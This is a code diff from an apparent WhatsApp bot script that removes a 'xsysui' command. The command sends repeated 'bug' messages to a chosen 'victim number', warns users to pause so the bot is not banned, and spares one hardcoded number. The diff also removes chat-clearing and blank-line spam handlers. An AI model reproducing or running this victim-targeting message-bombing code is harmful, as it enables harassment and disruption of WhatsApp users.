@@ -6210,46 +6210,5 @@ fs.unwatchFile(file)
 console.log(chalk.redBright(`Update ${__filename}`))
 delete require.cache[file]
 require(file)
-hw})
-//=================================================//
-case "xsysui": {
-  if (!isPremium) return replygcxeon(mess.prem)
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
-  }
-  replygcxeon("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendRepeatedMessages2(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  );
-}
-break;
-case 'clearall': {
-if (!isCreator) return replygcxeon(mess.owner)
-XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
-}
-break
-case 'clearchat':
-xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
 })
 //=================================================//
